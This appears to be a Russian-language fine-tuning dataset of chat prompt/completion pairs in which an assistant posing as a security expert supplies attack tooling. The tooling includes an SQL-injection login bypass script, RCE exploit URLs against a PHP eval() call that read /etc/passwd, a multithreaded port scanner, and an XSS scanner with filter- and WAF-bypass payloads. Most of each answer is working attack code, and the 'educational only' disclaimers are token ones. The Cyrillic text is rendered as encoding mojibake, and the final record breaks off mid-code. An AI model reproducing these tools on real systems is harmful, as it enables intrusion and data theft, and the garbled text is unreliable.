{"prompt": "<|system|>\n–¢—ã —ç–∫—Å–ø–µ—Ä—Ç –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å 15-–ª–µ—Ç–Ω–∏–º –æ–ø—ã—Ç–æ–º. –°–æ–∑–¥–∞–≤–∞–π —Ç–æ–ª—å–∫–æ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–µ PoC-—ç–∫—Å–ø–ª–æ–π—Ç—ã. –í—Å–µ–≥–¥–∞ –¥–æ–±–∞–≤–ª—è–π –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è –æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –∏—Å–ø–æ–ª—å–∑—É–π –∫–æ–¥ —Ç–æ–ª—å–∫–æ –¥–ª—è –æ–±—É—á–µ–Ω–∏—è.\n<|user|>\n–°–æ–∑–¥–∞–π —ç–∫—Å–ø–ª–æ–π—Ç –¥–ª—è SQL –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ –≤–µ–±-—Ñ–æ—Ä–º–µ –≤—Ö–æ–¥–∞. –í–∫–ª—é—á–∏: 1. –û–ø–∏—Å–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ 2. Proof-of-Concept –∫–æ–¥ 3. –ú–µ—Ä—ã –∑–∞—â–∏—Ç—ã 4. –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—é\n<|assistant|>\n", "completion": "```python\nimport requests\nimport urllib.parse\n\ndef test_sql_injection(url, username_param=\"username\", password_param=\"password\"):\n    \"\"\"\n    –¢–µ—Å—Ç –Ω–∞ SQL –∏–Ω—ä–µ–∫—Ü–∏—é –≤ —Ñ–æ—Ä–º–µ –≤—Ö–æ–¥–∞\n    –¢–û–õ–¨–ö–û –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!\n    \"\"\"\n    \n    # –ë–∞–∑–æ–≤—ã–µ payload'—ã –¥–ª—è SQL –∏–Ω—ä–µ–∫—Ü–∏–∏\n    payloads = [\n        \"' OR '1'='1' --\",\n        \"' OR 1=1 --\",\n        \"admin'--\",\n        \"' UNION SELECT 1,user(),version() --\"\n    ]\n    \n    print(\"[*] –ù–∞—á–∏–Ω–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏...\")\n    \n    for payload in payloads:\n        data = {\n            username_param: payload,\n            password_param: \"test\"\n        }\n        \n        try:\n            response = requests.post(url, data=data, timeout=5)\n            \n            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∏–∑–Ω–∞–∫–∏ —É—Å–ø–µ—à–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏\n            if (\"welcome\" in response.text.lower() or \n                response.status_code == 302 or\n                \"dashboard\" in response.text.lower()):\n                print(f\"[!] –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è SQL –∏–Ω—ä–µ–∫—Ü–∏—è: {payload}\")\n                return True\n                \n        except Exception as e:\n            print(f\"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ {payload}: {e}\")\n    \n    print(\"[*] SQL –∏–Ω—ä–µ–∫—Ü–∏—è –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞\")\n    return False\n\n# –ú–µ—Ä—ã –∑–∞—â–∏—Ç—ã:\n# 1. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã\n# 2. –í–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ\n# 3. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ORM\n# 4. –ü—Ä–∏–Ω—Ü–∏–ø –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –¥–ª—è –ë–î\n\nif __name__ == \"__main__\":\n    # –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!\n    target_url = \"http://vulnerable-site.com/login\"\n    test_sql_injection(target_url)\n```"}
{"prompt": "<|system|>\n–¢—ã —ç–∫—Å–ø–µ—Ä—Ç –ø–æ –∞–Ω–∞–ª–∏–∑—É –∫–æ–¥–∞ –∏ –ø–æ–∏—Å–∫—É —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ü—Ä–æ–≤–æ–¥–∏ –¥–µ—Ç–∞–ª—å–Ω—ã–π —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –∫–æ–¥–∞, –≤—ã—è–≤–ª—è–π –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ –ø—Ä–æ–±–ª–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –ø—Ä–µ–¥–ª–∞–≥–∞–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —Ä–µ—à–µ–Ω–∏—è.\n<|user|>\n–ü—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä—É–π —Å–ª–µ–¥—É—é—â–∏–π –∫–æ–¥ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π:\n\n<?php\n$user_input = $_GET['data'];\neval($user_input);\necho \"–†–µ–∑—É–ª—å—Ç–∞—Ç: \" . $user_input;\n?>\n\n–í–∫–ª—é—á–∏ –≤ –∞–Ω–∞–ª–∏–∑: 1. –í—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å –æ–ø–∏—Å–∞–Ω–∏–µ–º 2. –£—Ä–æ–≤–µ–Ω—å –∫—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç–∏ 3. –í–æ–∑–º–æ–∂–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ 4. –ö–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—é\n<|assistant|>\n", "completion": "## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ PHP –∫–æ–¥–µ\n\n### üö® –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏:\n\n#### 1. Remote Code Execution (RCE) —á–µ—Ä–µ–∑ eval()\n- **–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å**: –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø\n- **–û–ø–∏—Å–∞–Ω–∏–µ**: –§—É–Ω–∫—Ü–∏—è `eval()` –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π PHP –∫–æ–¥, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä GET\n- **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è**: \n  ```\n  http://site.com/script.php?data=system('whoami');\n  http://site.com/script.php?data=file_get_contents('/etc/passwd');\n  http://site.com/script.php?data=phpinfo();\n  ```\n\n#### 2. –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö\n- **–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å**: –í–´–°–û–ö–ê–Ø\n- **–û–ø–∏—Å–∞–Ω–∏–µ**: –î–∞–Ω–Ω—ã–µ –∏–∑ $_GET –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –±–µ–∑ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏\n- **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è**: –í–æ–∑–º–æ–∂–Ω—ã XSS, –∏–Ω—ä–µ–∫—Ü–∏–∏, –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Å –¥–∞–Ω–Ω—ã–º–∏\n\n### üí° –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—é:\n\n```php\n<?php\n// –ë–ï–ó–û–ü–ê–°–ù–ê–Ø –í–ï–†–°–ò–Ø\n\n// 1. –ë–µ–ª—ã–π —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π\n$allowed_operations = ['add', 'subtract', 'multiply'];\n$operation = $_GET['op'] ?? '';\n$num1 = filter_input(INPUT_GET, 'num1', FILTER_VALIDATE_INT);\n$num2 = filter_input(INPUT_GET, 'num2', FILTER_VALIDATE_INT);\n\nif (!in_array($operation, $allowed_operations) || $num1 === false || $num2 === false) {\n    die('–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã');\n}\n\n// 2. –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–π\nswitch ($operation) {\n    case 'add':\n        $result = $num1 + $num2;\n        break;\n    case 'subtract':\n        $result = $num1 - $num2;\n        break;\n    case 'multiply':\n        $result = $num1 * $num2;\n        break;\n    default:\n        $result = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ–ø–µ—Ä–∞—Ü–∏—è';\n}\n\n// 3. –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –≤—ã–≤–æ–¥\necho \"–†–µ–∑—É–ª—å—Ç–∞—Ç: \" . htmlspecialchars($result, ENT_QUOTES, 'UTF-8');\n?>\n```\n\n### üõ°Ô∏è –û–±—â–∏–µ –ø—Ä–∏–Ω—Ü–∏–ø—ã –∑–∞—â–∏—Ç—ã:\n1. **–ù–∏–∫–æ–≥–¥–∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ eval()** —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º–∏ –¥–∞–Ω–Ω—ã–º–∏\n2. **–í–∞–ª–∏–¥–∏—Ä—É–π—Ç–µ –≤—Å–µ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ**\n3. **–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–µ–ª—ã–µ —Å–ø–∏—Å–∫–∏** –≤–º–µ—Å—Ç–æ —á–µ—Ä–Ω—ã—Ö\n4. **–≠–∫—Ä–∞–Ω–∏—Ä—É–π—Ç–µ –≤—ã–≤–æ–¥** –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è XSS\n5. **–ü—Ä–∏–Ω—Ü–∏–ø –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π**"}
{"prompt": "<|system|>\n–¢—ã —ç–∫—Å–ø–µ—Ä—Ç –ø–æ —Å–µ—Ç–µ–≤–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—é –ø–µ–Ω—Ç–µ—Å—Ç–æ–≤. –°–æ–∑–¥–∞–≤–∞–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –∏ —Å–∫—Ä–∏–ø—Ç—ã –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å–µ—Ç–µ–π —Ç–æ–ª—å–∫–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö –∏ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤–ª–∞–¥–µ–ª—å—Ü–µ–≤ —Å–∏—Å—Ç–µ–º.\n<|user|>\n–°–æ–∑–¥–∞–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–æ–≤ —Å –º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ—Å—Ç—å—é. –í–∫–ª—é—á–∏: 1. –û–ø–∏—Å–∞–Ω–∏–µ –º–µ—Ç–æ–¥–∏–∫–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è 2. –†–∞–±–æ—á–∏–π –∫–æ–¥ —Å –ø–æ–¥—Ä–æ–±–Ω—ã–º–∏ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è–º–∏ 3. –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è 4. –ú–µ—Ä—ã –ø—Ä–µ–¥–æ—Å—Ç–æ—Ä–æ–∂–Ω–æ—Å—Ç–∏ 5. –°–ø–æ—Å–æ–±—ã –∑–∞—â–∏—Ç—ã –æ—Ç –¥–∞–Ω–Ω–æ–≥–æ —Ç–∏–ø–∞ –∞—Ç–∞–∫\n<|assistant|>\n", "completion": "```python\nimport socket\nimport threading\nimport argparse\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nimport time\nimport sys\n\nclass PortScanner:\n    \"\"\"\n    –ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω—ã–π —Å–∫–∞–Ω–µ—Ä –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π\n    –¢–û–õ–¨–ö–û –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö!\n    \"\"\"\n    \n    def __init__(self, target, start_port=1, end_port=1000, threads=100, timeout=1):\n        self.target = target\n        self.start_port = start_port\n        self.end_port = end_port\n        self.threads = threads\n        self.timeout = timeout\n        self.open_ports = []\n        self.lock = threading.Lock()\n    \n    def scan_port(self, port):\n        \"\"\"\n        –°–∫–∞–Ω–∏—Ä—É–µ—Ç –æ–¥–∏–Ω –ø–æ—Ä—Ç –Ω–∞ —Ü–µ–ª–µ–≤–æ–º —Ö–æ—Å—Ç–µ\n        \"\"\"\n        try:\n            # –°–æ–∑–¥–∞–µ–º TCP —Å–æ–∫–µ—Ç\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n                sock.settimeout(self.timeout)\n                result = sock.connect_ex((self.target, port))\n                \n                if result == 0:\n                    # –ü—ã—Ç–∞–µ–º—Å—è –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Å–µ—Ä–≤–∏—Å\n                    service = self.get_service_name(port)\n                    \n                    with self.lock:\n                        self.open_ports.append((port, service))\n                        print(f\"[+] –ü–æ—Ä—Ç {port} –æ—Ç–∫—Ä—ã—Ç - {service}\")\n                    \n                    return port\n        except Exception as e:\n            # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è\n            pass\n        \n        return None\n    \n    def get_service_name(self, port):\n        \"\"\"\n        –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –Ω–∞–∑–≤–∞–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞ –ø–æ –Ω–æ–º–µ—Ä—É –ø–æ—Ä—Ç–∞\n        \"\"\"\n        common_ports = {\n            21: \"FTP\",\n            22: \"SSH\",\n            23: \"Telnet\",\n            25: \"SMTP\",\n            53: \"DNS\",\n            80: \"HTTP\",\n            110: \"POP3\",\n            143: \"IMAP\",\n            443: \"HTTPS\",\n            993: \"IMAPS\",\n            995: \"POP3S\"\n        }\n        \n        return common_ports.get(port, \"Unknown\")\n    \n    def scan(self):\n        \"\"\"\n        –ó–∞–ø—É—Å–∫–∞–µ—Ç –º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤\n        \"\"\"\n        print(f\"[*] –ù–∞—á–∏–Ω–∞–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ {self.target}\")\n        print(f\"[*] –î–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤: {self.start_port}-{self.end_port}\")\n        print(f\"[*] –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤: {self.threads}\")\n        print(\"-\" * 50)\n        \n        start_time = time.time()\n        \n        # –ò—Å–ø–æ–ª—å–∑—É–µ–º ThreadPoolExecutor –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞–º–∏\n        with ThreadPoolExecutor(max_workers=self.threads) as executor:\n            # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –≤—Å–µ—Ö –ø–æ—Ä—Ç–æ–≤\n            future_to_port = {\n                executor.submit(self.scan_port, port): port \n                for port in range(self.start_port, self.end_port + 1)\n            }\n            \n            # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—ã–µ –∑–∞–¥–∞—á–∏\n            for future in as_completed(future_to_port):\n                try:\n                    future.result()\n                except Exception as e:\n                    print(f\"[!] –û—à–∏–±–∫–∞: {e}\")\n        \n        end_time = time.time()\n        \n        # –í—ã–≤–æ–¥–∏–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã\n        print(\"-\" * 50)\n        print(f\"[*] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –∑–∞ {end_time - start_time:.2f} —Å–µ–∫—É–Ω–¥\")\n        print(f\"[*] –ù–∞–π–¥–µ–Ω–æ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤: {len(self.open_ports)}\")\n        \n        if self.open_ports:\n            print(\"\\n[+] –û—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã:\")\n            for port, service in sorted(self.open_ports):\n                print(f\"    {port}/tcp - {service}\")\n        \n        return self.open_ports\n\ndef main():\n    # –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï –û –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò\n    print(\"\" + \"=\"*60)\n    print(\"    –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï: –¢–û–õ–¨–ö–û –î–õ–Ø –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–´–• –¶–ï–õ–ï–ô!\")\n    print(\"    –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö!\")\n    print(\"    –ü–æ–ª—É—á–∏—Ç–µ –ø–∏—Å—å–º–µ–Ω–Ω–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º!\")\n    print(\"=\"*60 + \"\\n\")\n    \n    parser = argparse.ArgumentParser(description=\"–ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω—ã–π —Å–∫–∞–Ω–µ—Ä –ø–æ—Ä—Ç–æ–≤\")\n    parser.add_argument(\"target\", help=\"–¶–µ–ª–µ–≤–æ–π —Ö–æ—Å—Ç –∏–ª–∏ IP\")\n    parser.add_argument(\"-p\", \"--ports\", default=\"1-1000\", help=\"–î–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä: 1-1000)\")\n    parser.add_argument(\"-t\", \"--threads\", type=int, default=100, help=\"–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤\")\n    parser.add_argument(\"--timeout\", type=float, default=1, help=\"–¢–∞–π–º–∞—É—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è\")\n    \n    args = parser.parse_args()\n    \n    try:\n        # –ü–∞—Ä—Å–∏–º –¥–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤\n        start_port, end_port = map(int, args.ports.split('-'))\n        \n        # –°–æ–∑–¥–∞–µ–º –∏ –∑–∞–ø—É—Å–∫–∞–µ–º —Å–∫–∞–Ω–µ—Ä\n        scanner = PortScanner(\n            target=args.target,\n            start_port=start_port,\n            end_port=end_port,\n            threads=args.threads,\n            timeout=args.timeout\n        )\n        \n        scanner.scan()\n        \n    except KeyboardInterrupt:\n        print(\"\\n[!] –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–µ—Ä–≤–∞–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º\")\n        sys.exit(1)\n    except Exception as e:\n        print(f\"[!] –û—à–∏–±–∫–∞: {e}\")\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## üõ°Ô∏è –°–ø–æ—Å–æ–±—ã –∑–∞—â–∏—Ç—ã –æ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–æ–≤:\n\n1. **–§–∞–π–µ—Ä–≤–æ–ª**: –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –ø–æ—Ä—Ç–æ–≤\n2. **IDS/IPS**: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è\n3. **Port knocking**: –°–∫—Ä—ã—Ç–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤\n4. **Honeypots**: –õ–æ–≤—É—à–∫–∏ –¥–ª—è —Å–∫–∞–Ω–µ—Ä–æ–≤\n5. **Rate limiting**: –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ —Å–∫–æ—Ä–æ—Å—Ç–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π"}
{"prompt": "<|system|>\n–¢—ã —ç–∫—Å–ø–µ—Ä—Ç –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. –°–æ–∑–¥–∞–≤–∞–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏, –≤—Å–µ–≥–¥–∞ –ø–æ–¥—á–µ—Ä–∫–∏–≤–∞–π –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–µ —Ü–µ–ª–∏ –∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è.\n<|user|>\n–°–æ–∑–¥–∞–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–∏. –í–∫–ª—é—á–∏: 1. –û–ø–∏—Å–∞–Ω–∏–µ —Ç–∏–ø–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ 2. –°–∫—Ä–∏–ø—Ç –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è 3. –ü—Ä–∏–º–µ—Ä—ã payload'–æ–≤ 4. –ú–µ—Ç–æ–¥—ã –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è 5. –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ\n<|assistant|>\n", "completion": "```python\nimport requests\nimport urllib.parse\nfrom bs4 import BeautifulSoup\nimport re\nimport time\n\nclass XSSScanner:\n    \"\"\"\n    –°–∫–∞–Ω–µ—Ä XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π\n    –¢–û–õ–¨–ö–û –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π!\n    \"\"\"\n    \n    def __init__(self, base_url, session=None):\n        self.base_url = base_url\n        self.session = session or requests.Session()\n        self.vulnerabilities = []\n        \n        # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∫–∞–∫ —É –æ–±—ã—á–Ω–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞\n        self.session.headers.update({\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\n        })\n    \n    # –ö–æ–ª–ª–µ–∫—Ü–∏—è XSS payload'–æ–≤ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è\n    XSS_PAYLOADS = [\n        # –ë–∞–∑–æ–≤—ã–µ payload'—ã\n        \"<script>alert('XSS')</script>\",\n        \"<img src=x onerror=alert('XSS')>\",\n        \"<svg onload=alert('XSS')>\",\n        \"javascript:alert('XSS')\",\n        \n        # –û–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–æ–≤\n        \"<ScRiPt>alert('XSS')</ScRiPt>\",\n        \"<script>alert(String.fromCharCode(88,83,83))</script>\",\n        \"<img src=\\\"javascript:alert('XSS')\\\">\",\n        \"'><script>alert('XSS')</script>\",\n        \n        # Event handlers\n        \"<input onfocus=alert('XSS') autofocus>\",\n        \"<select onfocus=alert('XSS') autofocus>\",\n        \"<textarea onfocus=alert('XSS') autofocus>\",\n        \n        # HTML5 payload'—ã\n        \"<details ontoggle=alert('XSS') open>\",\n        \"<marquee onstart=alert('XSS')>\",\n        \n        # –û–±—Ö–æ–¥ WAF\n        \"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>\"\n    ]\n    \n    def find_forms(self, url):\n        \"\"\"\n        –ù–∞—Ö–æ–¥–∏—Ç –≤—Å–µ —Ñ–æ—Ä–º—ã –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ\n        \"\"\"\n        try:\n            response = self.session.get(url, timeout=10)\n            soup = BeautifulSoup(response.content, 'html.parser')\n            forms = soup.find_all('form')\n            \n            form_data = []\n            for form in forms:\n                form_info = {\n                    'action': form.get('action', ''),\n                    'method': form.get('method', 'GET').upper(),\n                    'inputs': []\n                }\n                \n                # –ù–∞—Ö–æ–¥–∏–º –≤—Å–µ input –ø–æ–ª—è\n                inputs = form.find_all(['input', 'textarea', 'select'])\n                for input_field in inputs:\n                    if input_field.get('type') not in ['submit', 'button', 'hidden']:\n                        form_info['inputs'].append({\n                            'name': input_field.get('name', ''),\n                            'type': input_field.get('type', 'text')\n                        })\n                \n                form_data.append(form_info)\n            \n            return form_data\n            \n        except Exception as e:\n            print(f\"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ —Ñ–æ—Ä–º: {e}\")\n            return []\n    \n    def test_reflected_xss(self, url, params):\n        \"\"\"\n        –¢–µ—Å—Ç–∏—Ä—É–µ—Ç reflected XSS\n        \"\"\"\n        print(f\"[*] 